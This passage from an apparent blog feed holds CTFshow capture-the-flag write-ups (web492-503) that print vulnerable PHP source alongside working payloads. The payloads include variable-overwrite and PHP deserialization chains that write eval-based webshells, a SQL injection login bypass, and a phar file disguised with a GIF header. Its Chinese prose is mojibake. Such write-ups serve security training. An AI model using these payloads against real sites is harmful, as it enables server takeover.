class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'rm -rf cache/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'cache clear'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$username</code> è™½ç„¶æ²¡æœ‰ç»è¿‡md5å¤„ç†ä½†æ˜¯ä¹ŸåŒ¹é…æ‰äº†éæ³•å­—ç¬¦ï¼Œå› ä¸º<code>extract($_GET);</code>åœ¨å‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹userå˜é‡è¿›è¡Œå˜é‡è¦†ç›–ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨index.phpä¸­å†™ä¸€å¥è¯æœ¨é©¬</p><p>æ»¡è¶³æ¡ä»¶ï¼š</p><ol><li>ç»•è¿‡åŒ¹é…ï¼Œä¿è¯userå˜é‡ä¸è¢«èµ‹å€¼</li><li>é’ˆå¯¹userä¸­çš„é”®å€¼usernameè¿›è¡Œä¸€å¥è¯æœ¨é©¬æ“ä½œ</li></ol><p>payloadï¼š</p><p><code>?action=check&amp;username[]=1&amp;password=123&amp;user[username]=&lt;?php eval($_POST[8]);?&gt;</code></p><p>ç„¶åè®¿é—®ï¼š</p><p><code>/cache/6a992d5529f459a44fee58c733255e86.php</code></p><h1 id="web493-495"><a href="#web493-495" class="headerlink" title="web493-495"></a>web493-495</h1><p><strong>?action=../indexï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/render_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/db_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æ­¤å¤„å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php?action=login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php?action=login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'check'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[A-Za-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select username from user where username = '"</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"' and password='"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"' order by id limit 1"</span><span class="token punctuation">;</span>        <span class="token variable">$db</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span><span class="token operator">=</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">select_one</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'clear'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'rm -rf cache/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'cache clear'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>?action=../render/render_classï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'file_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'cache_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">templateUtil</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cache<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cache_exists</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> cache<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get_cache</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$templateContent</span><span class="token operator">=</span>fileUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token string">'templates/'</span><span class="token punctuation">.</span><span class="token variable">$template</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$cache</span><span class="token operator">=</span>templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">shade</span><span class="token punctuation">(</span><span class="token variable">$templateContent</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cache<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">create_cache</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$cache</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span>  <span class="token keyword">function</span> <span class="token function">shade</span><span class="token punctuation">(</span><span class="token variable">$templateContent</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arg</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$templateContent</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'{{'</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">'}}'</span><span class="token punctuation">,</span> <span class="token string">'&lt;ï¼--'</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">.</span><span class="token string">'-->'</span><span class="token punctuation">,</span> <span class="token variable">$templateContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$templateContent</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>?action=../render/db_classï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">db</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$log</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$port</span><span class="token operator">=</span><span class="token string">'3306'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$addr</span><span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$database</span><span class="token operator">=</span><span class="token string">'ctfshow'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">addr</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span>  <span class="token keyword">function</span> <span class="token function">select_one</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span><span class="token operator">=</span><span class="token variable">$sql</span><span class="token punctuation">;</span>        <span class="token variable">$conn</span> <span class="token operator">=</span> db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span>  <span class="token keyword">function</span> <span class="token function">select_one_array</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span><span class="token operator">=</span><span class="token variable">$sql</span><span class="token punctuation">;</span>        <span class="token variable">$conn</span> <span class="token operator">=</span> db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">dbLog</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$log</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span><span class="token operator">=</span><span class="token string">'log/'</span><span class="token punctuation">.</span><span class="token function">date_format</span><span class="token punctuation">(</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.txt'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">.</span><span class="token function">date_format</span><span class="token punctuation">(</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Y-m-d-H-i-s"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">' '</span><span class="token punctuation">.</span><span class="token variable">$sql</span><span class="token punctuation">.</span><span class="token string">' \r\n'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å…³é”®ä»£ç </span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">db</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$log</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dblog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">dbLog</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$log</span><span class="token operator">=</span><span class="token string">'/var/www/html/2.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//O%3A2%3A%22db%22%3A1%3A%7Bs%3A3%3A%22log%22%3BO%3A5%3A%22dbLog%22%3A2%3A%7Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A19%3A%22%2Fvar%2Fwww%2Fhtml%2F2.php%22%3B%7D%7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>494ã€495éœ€è¦è¿æ¥æ•°æ®åº“</p><h1 id="web503"><a href="#web503" class="headerlink" title="web503"></a>web503</h1><p><strong>å¼±å£ä»¤ğŸ‘‡ï¼š</strong></p><p><strong>?action=checkï¼šusername=1â€™ || 1#&amp;password=1</strong></p><p>ç‚¹å¼€ç³»ç»Ÿé…ç½®ï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210921162551233.png" alt="image-20210921162551233"></p><p>æ‰¾åˆ°ä¸€ä¸ªæ¥å£ï¼Œ<strong>?action=../api/admin_settings.php</strong>ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210921163137200.png" alt="image-20210921163137200"></p><p>ä¸€ä¸ªæ˜¯ç®¡ç†å‘˜ä¿¡æ¯é…ç½®æ£€æµ‹æ¥å£ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶ä¸Šä¼ æ£€æµ‹æ¥å£</p><p>ç”Ÿæˆpharæ–‡ä»¶ï¼Œåˆ©ç”¨file_existså‡½æ•°æ¥è§¦å‘ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">dbLog</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string">"&lt;?php eval(\$_POST[1]);?>"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$log</span><span class="token operator">=</span><span class="token string">"a.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"aaa.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¿é—®/api/admin_db_backup.phpï¼š</p><pre><code>/api/admin_db_backup.phpPOSTï¼špre=phar:///var/www/html/img/d8f8dedc0591f3b913dbcdf0fdea2687.jpg&amp;db_format=g</code></pre><p>æ‰§è¡Œå³ä¼šç”Ÿæˆ/var/www/html/2.php</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¸­æœŸæµ‹è¯„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éª‘å£«cmså®¡è®¡</title>
      <link href="/2021/09/16/qi-shi-cms-shen-ji/"/>
      <url>/2021/09/16/qi-shi-cms-shen-ji/</url>
      
